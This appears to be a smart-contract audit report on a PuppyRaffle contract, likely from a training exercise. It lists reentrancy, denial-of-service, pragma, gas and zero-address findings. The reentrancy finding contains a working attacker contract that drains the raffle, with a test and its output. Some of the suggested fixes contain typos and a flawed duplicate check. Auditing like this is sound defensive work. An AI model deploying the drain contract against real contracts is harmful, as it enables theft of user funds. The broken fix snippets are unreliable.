## [H-1] In **`PuppyRaffle::refund`** external call is being made before the state is updated, this will become an easy target for **Reentancy** attack

### Description:
> The **`PuppyRaffle::refund`** doesn't follow **CEI**(Checks, Effects, Interactions) i.e. it sends the refund value back to player before updating the `players` array. Due to this a malicious user can carry out a reentrancy attack using a malicious Smart contract to drain all the money present in `PuppyRaffle`. This will surely discourage the users from entring into the raffle.

```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```


### Impact: 
> All the money being stored in the `PuppyRaffle` contract is not safe, as anyone can exploit the system and take away all the money. This will cause other players to loose a lot of money and will drastically destroy your reputation.

### Proof of Concept:

1. Users enters Raffle.
2. Attacker sets up a contract with a `fallback` functions that calls `PuppyRaffle::refund`
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle::refund` from contract draining all the money.

<details>
<summary>PoC- Attack Contract</summary>

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

</details>

<details>
<summary>PoC- Test Func</summary>

```java
function testReentrancyAttack() public playerEntered {
    address[] memory players = new address[](4);
    players[0] = address(10);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker reentrancyAttackContract = new ReentrancyAttacker(
        puppyRaffle
    );
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);
    uint256 startingPuppyBalance = address(puppyRaffle).balance;
    uint256 startingAttackContractBalance = address(
        reentrancyAttackContract
    ).balance;

    vm.prank(attacker);
    reentrancyAttackContract.attack{value: entranceFee}();

    console.log(
        "Attack Contract Balance (Start): ",
        startingAttackContractBalance
    );
    console.log("Puppy Contract Balance (Start): ", startingPuppyBalance);
    console.log(
        "Attack Contract Balance (End): ",
        address(reentrancyAttackContract).balance
    );
    console.log(
        "Puppy Contract Balance (End): ",
        address(puppyRaffle).balance
    );
}
```

</details>

<details>
<summary>Output</summary>

```
[PASS] testReentrancyAttack() (gas: 538395)
Logs:
  Attack Contract Balance (Start):  0
  Puppy Contract Balance (Start):  5000000000000000000
  Attack Contract Balance (End):  6000000000000000000
  Puppy Contract Balance (End):  0
```

</details>



### Recommended Mitigation:

> Always try to update state before making any external calls.<br>
> Can use `Openzeppelin::ReentrancyGuard`



## [M-#] Unbounded For loop in **`PuppyRaffle::enterRaffle`** is a potential Denial of Service (DoS) atatck, leads to increament of gas cost for later entrants

### Description:
> The **`PuppyRaffle::enterRaffle`** functions has a *for* loop that loops through `players` array to check for duplicate players. But the longer the `players` array is the longer the checks will be, so, the players joining very late will have to incur huge gas cost compared to those players who joins first. This gives a very huge advantage to earlier players. So more players will lead to more gas cost.

```javascript
@>  for (uint256 i = 0; i < players.length - 1; i++) {
                for (uint256 j = i + 1; j < players.length; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            }
```

### Impact: 
> The `gas cost` to enter raffle will dramatically increase as more players enter the raffle. This will discourage more players from entering the raffle.<br>
> An Attacker may make `PuppyRaffle::players` array so big that no one else can enter the raffle, guranteeing themselves the win.

### Proof of Concept:

If we have 2 batch of players, 100 in each batch;<br>
- 1st 100 ~ 6252039 gas<br>
- 2nd 100 ~ 18067744 gas<br>

From aboce data it is evident that gas cost becomes 3x for the 2nd batch of players. This will become even worse if more players start to join.

<details>
<summary>PoC</summary>

```java
function testDOSAttackEnterRaffle() public {
      vm.txGasPrice(1);
      // Gas cost #1
      // making 100 players
      uint256 n = 100;
      address[] memory players = new address[](n);
      for (uint256 i = 0; i < n; i++) {
          players[i] = address(i);
      }
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee*100}(players);
      // Gas cost #2
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart-gasEnd)*tx.gasprice;
      console.log("1st 100 players: ",gasUsedFirst);

      for (uint256 i = 0; i < n; i++) {
          players[i] = address(i + n);
      }
      uint256 gasStart1 = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee*100}(players);
      // Gas cost #2
      uint256 gasEnd1 = gasleft();
      uint256 gasUsedFirst1 = (gasStart1-gasEnd1)*tx.gasprice;
      console.log("2nd 100 players: ",gasUsedFirst1);
      assert(gasUsedFirst1>gasUsedFirst);
  }
```

</details>

### Recommended Mitigation:

> There are few recomendations.<br>

1. Consider allowing duplicates. Users can easily make new wallet addresses, so, duplicate check won't stop a user to enter multiple times.
2. Consider using **mappings** for doing duplicate checks rather than using for loops.

```diff
+     mapping(address => uint256) public playeraddressTopresence;

function enterRaffle(address[] memory newPlayers) public payable {
        // @Q: were "custom reverts" for 0.7.6
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }
        
+        for (uint256 i = 0; i < newPlayers.length; i++) {
+            require(playeraddressTopresence[players[i]] < 1, "Duplicate players");
+        }

        // Check for duplicates
        // @Audit:: DoS Attack [High]
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }


        emit RaffleEnter(newPlayers);
    }

```


## [L-1] Solidity pragma should be specific and not wide

### Description:
> Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

### Recommended Mitigation:
```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;
```


## [G-1] Unchanged state variables should be marked as `constant` or `immutable`

### Description:
> Reading from constant/immutable variables costs us less gas compared to reading from storage variables.<br>

### Instances:
> `PuppyRaffle::raffleDuration` should be marked as `immutable`.<br>
> `PuppyRaffle::commonImageUri` should be marked as `constant`.<br>
> `PuppyRaffle::rareImageUri` should be marked as `constant`.<br>
> `PuppyRaffle::legendaryImageUri` should be marked as `constant`.<br>

### Recommended Mitigation:
```diff
- uint256 public raffleDuration;
+ uint256 public constant raffleDuration = ;
```

## [G-2] Should use cached array length instead of referencing `length` member of the storage array.

### Description:
> Detects for loops that use length member of some storage array in their loop condition and don't modify it. So to save some gas it is recomended to store the storage variables locally, so that every time when we call those variables we read from memory, more gas efficient indeed.

### Recommended Mitigation:
```diff
+ uints256 playersLength = players.length
-for (uint256 i = 0; i < players.length - 1; i++) {
+for (uint256 i = 0; i < playersLength - 1; i++) {
-    for (uint256 j = i + 1; j < players.length; j++) {
+    for (uint256 j = i + 1; j < playersLength; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    } 
}
```


## [I-1] Usage of outdated version of solidity is not recomended

### Description:
> `solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

### Recommended Mitigation:
Deploy with any of the following Solidity versions:
* `0.8.20`

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) docs for more information.


## [I-2] Missing checks for address(0) when assigning values to address state variables

### Description:
> Assigning values to address state variables without checking for `address(0)`.

### Instances:
- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 150](src/PuppyRaffle.sol#L150)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 168](src/PuppyRaffle.sol#L168)

	```solidity
	        feeAddress = newFeeAddress;
	```

### Recommended Mitigation:
```javascript
require(_feeAddress != address(0), zero address detected);
```


## [S-#] TITLE (Root Cause + Impact)

### Description:

### Impact: 

### Proof of Concept:

### Recommended Mitigation:

